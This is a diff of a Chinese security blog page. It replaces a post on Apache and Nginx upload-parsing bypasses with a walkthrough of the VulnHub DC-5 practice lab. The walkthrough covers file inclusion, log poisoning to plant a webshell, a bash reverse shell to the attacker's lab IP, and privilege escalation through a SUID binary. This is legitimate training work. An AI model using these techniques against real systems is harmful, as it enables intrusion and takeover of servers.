@@ -21,35 +21,45 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"syst1m.top","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.12.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="解析漏洞Apache 换行解析漏洞（CVE-2017-15715）上传抓包  在1.php后面插入一个\x0A（注意，不能是\x0D\x0A，只能是一个\x0A），不再拦截：">
+    <meta name="description" content="漏洞环境vulnhub https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;dc-5,314&#x2F;靶机:172.16.17.146攻击机kali:172.16.17.140 描述 信息收集">
 <meta property="og:type" content="article">
-<meta property="og:title" content="vulhub靶场">
-<meta property="og:url" content="https://syst1m.top/2022/05/15/vulhub%E9%9D%B6%E5%9C%BA/index.html">
+<meta property="og:title" content="vulnhub-dc5打靶">
+<meta property="og:url" content="https://syst1m.top/2022/06/14/vulnhub-dc5%E6%89%93%E9%9D%B6/index.html">
 <meta property="og:site_name" content="Syst1m">
-<meta property="og:description" content="解析漏洞Apache 换行解析漏洞（CVE-2017-15715）上传抓包  在1.php后面插入一个\x0A（注意，不能是\x0D\x0A，只能是一个\x0A），不再拦截：">
+<meta property="og:description" content="漏洞环境vulnhub https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;dc-5,314&#x2F;靶机:172.16.17.146攻击机kali:172.16.17.140 描述 信息收集">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202205151546551.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202205151628536.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202205151629134.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202205151638905.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202205151638268.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202205151650893.png">
-<meta property="article:published_time" content="2022-05-15T07:41:23.000Z">
-<meta property="article:modified_time" content="2022-05-15T08:51:19.373Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206141926926.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206141959729.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206142002735.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206142002568.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206142008726.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206142009106.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206142010169.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206142013650.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206142025366.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206142210938.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206142212468.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206142214174.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206142217377.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206142235068.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206142236665.png">
+<meta property="article:published_time" content="2022-06-14T11:21:37.000Z">
+<meta property="article:modified_time" content="2022-06-14T14:37:14.653Z">
 <meta property="article:author" content="Syst1m">
-<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="文件包含">
+<meta property="article:tag" content="vulnhub">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/chencicici/images/main/202205151546551.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206141926926.png">
 
 
-<link rel="canonical" href="https://syst1m.top/2022/05/15/vulhub%E9%9D%B6%E5%9C%BA/">
+<link rel="canonical" href="https://syst1m.top/2022/06/14/vulnhub-dc5%E6%89%93%E9%9D%B6/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://syst1m.top/2022/05/15/vulhub%E9%9D%B6%E5%9C%BA/","path":"2022/05/15/vulhub靶场/","title":"vulhub靶场"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://syst1m.top/2022/06/14/vulnhub-dc5%E6%89%93%E9%9D%B6/","path":"2022/06/14/vulnhub-dc5打靶/","title":"vulnhub-dc5打靶"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>vulhub靶场 | Syst1m</title>
+<title>vulnhub-dc5打靶 | Syst1m</title>
   
 
 
@@ -152,7 +162,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Apache-%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89"><span class="nav-number">1.1.</span> <span class="nav-text">Apache 换行解析漏洞（CVE-2017-15715）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Apache-%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.</span> <span class="nav-text">Apache 多后缀解析漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Nginx-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.3.</span> <span class="nav-text">Nginx 解析漏洞</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="nav-number">1.</span> <span class="nav-text">漏洞环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0"><span class="nav-number">2.</span> <span class="nav-text">描述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploit"><span class="nav-number">4.</span> <span class="nav-text">Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95%E8%AF%BB%E5%8F%96%E5%88%AB%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="nav-number">4.1.</span> <span class="nav-text">尝试读取别的信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%99webshell"><span class="nav-number">4.2.</span> <span class="nav-text">写webshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">4.3.</span> <span class="nav-text">反弹shell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">5.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#suid%E6%8F%90%E6%9D%83"><span class="nav-number">5.1.</span> <span class="nav-text">suid提权</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -244,7 +254,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://syst1m.top/2022/05/15/vulhub%E9%9D%B6%E5%9C%BA/">
+    <link itemprop="mainEntityOfPage" href="https://syst1m.top/2022/06/14/vulnhub-dc5%E6%89%93%E9%9D%B6/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/IMG_0010.JPG">
@@ -257,12 +267,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="vulhub靶场 | Syst1m">
+      <meta itemprop="name" content="vulnhub-dc5打靶 | Syst1m">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          vulhub靶场
+          vulnhub-dc5打靶
         </h1>
 
         <div class="post-meta-container">
@@ -274,7 +284,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2022-05-15 15:41:23 / 修改时间：16:51:19" itemprop="dateCreated datePublished" datetime="2022-05-15T15:41:23+08:00">2022-05-15</time>
+      <time title="创建时间：2022-06-14 19:21:37 / 修改时间：22:37:14" itemprop="dateCreated datePublished" datetime="2022-06-14T19:21:37+08:00">2022-06-14</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -282,7 +292,7 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+          <a href="/categories/%E6%89%93%E9%9D%B6/" itemprop="url" rel="index"><span itemprop="name">打靶</span></a>
         </span>
     </span>
 
@@ -303,24 +313,29 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><h2 id="Apache-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache 换行解析漏洞（CVE-2017-15715）"></a>Apache 换行解析漏洞（CVE-2017-15715）</h2><p>上传抓包</p>
-<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151546551.png"></p>
-<p>在1.php后面插入一个<code>\x0A</code>（注意，不能是<code>\x0D\x0A</code>，只能是<code>一个\x0A</code>），不再拦截：</p>
-<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151628536.png"></p>
-<p>访问</p>
-<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151629134.png"></p>
-<h2 id="Apache-多后缀解析漏洞"><a href="#Apache-多后缀解析漏洞" class="headerlink" title="Apache 多后缀解析漏洞"></a>Apache 多后缀解析漏洞</h2><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：</p>
-<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType text/html <span class="string">.html</span></span><br><span class="line">AddLanguage zh-CN <span class="string">.cn</span></span><br></pre></td></tr></table></figure>
-<p>其给<code>.html</code>后缀增加了<code>media-type</code>，值为<code>text/html</code>；给<code>.cn</code>后缀增加了语言，值为<code>zh-CN</code>。此时，如果用户请求文件<code>index.cn.html</code>，他将返回一个中文的html页面。</p>
-<p>以上就是Apache多后缀的特性。如果运维人员给<code>.php</code>后缀增加了处理器：</p>
-<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler <span class="built_in">application</span>/x-httpd-php .php</span><br></pre></td></tr></table></figure>
-<p>那么，在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p>
-<p>上传<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151638905.png"></p>
-<p>访问<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151638268.png"></p>
-<p>图片被解析为PHP</p>
-<h2 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h2><p>该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。</p>
-<p>上传图片马,然后添加后缀访问<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151650893.png"></p>
-<p>图片被解析成PHP</p>
+        <h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>vulnhub <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-5,314/">https://www.vulnhub.com/entry/dc-5,314/</a><br>靶机:172.16.17.146<br>攻击机kali:172.16.17.140</p>
+<h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206141926926.png"></p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫描靶机<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206141959729.png"></p>
+<p>开了111端口rpcbind,百度是拒绝服务漏洞,忽略</p>
+<p>打开网站首页,扫一下目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142002735.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142002568.png"></p>
+<p>发现一个留言板,提交看看<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142008726.png"><br>多次提交后发现,页脚在变化,结合扫目录时候发现一个footer.php<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142009106.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142010169.png"></p>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>应该是包含了这个footer.php文件,尝试文件包含漏洞,猜一下参数名<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142013650.png"></p>
+<p>尝试伪协议getshell,但是应该没有开启allow_url_include,默认为关闭</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1?file=php://input PostData:&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="尝试读取别的信息"><a href="#尝试读取别的信息" class="headerlink" title="尝试读取别的信息"></a>尝试读取别的信息</h2><p>权限很低,只能读取一下nginx的日志,因为扫过目录所以信息很多,翻到最后可以看到我们读取&#x2F;etc&#x2F;passwd的请求<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142025366.png"></p>
+<h2 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h2><p>总结一下,现在我们有文件包含,能查看nginx日志<br>那么我是否可以构造一句话请求,让他写入日志,再利用文件包含去执行<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142210938.png"></p>
+<p>这里有一个坑,请求发送之后,再去查看日志,却没有,其实已经写进去了<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142212468.png"></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>反弹一个shell到kali</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/172.16.17.140/4444 &lt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142214174.png"></p>
+<p>这里反弹回来的就是一个交互式shell</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>翻了翻目录,没什么东西,看看以root权限运行的命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142217377.png"></p>
+<p>有一个screen<br>Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。</p>
+<p>kali搜索一下利用<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142235068.png"></p>
+<p>将exp复制出来用蚁剑直接写到tmp目录下<br>在root目录下拿到flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206142236665.png"></p>
 
     </div>
 
@@ -358,7 +373,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="https://syst1m.top/2022/05/15/vulhub%E9%9D%B6%E5%9C%BA/" title="vulhub靶场">https://syst1m.top/2022/05/15/vulhub靶场/</a>
+      <a href="https://syst1m.top/2022/06/14/vulnhub-dc5%E6%89%93%E9%9D%B6/" title="vulnhub-dc5打靶">https://syst1m.top/2022/06/14/vulnhub-dc5打靶/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -367,21 +382,19 @@
 </div>
 
           <div class="post-tags">
-              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"># 漏洞复现</a>
+              <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag"># 文件包含</a>
+              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2022/05/11/upload-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" rel="prev" title="upload-labs靶场通关">
-                  <i class="fa fa-chevron-left"></i> upload-labs靶场通关
+                <a href="/2022/06/13/vlunhub-dc4%E6%89%93%E9%9D%B6/" rel="prev" title="vlunhub-dc4打靶">
+                  <i class="fa fa-chevron-left"></i> vlunhub-dc4打靶
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2022/05/19/xss-labs%E9%9D%B6%E5%9C%BA/" rel="next" title="xss-labs靶场">
-                  xss-labs靶场 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
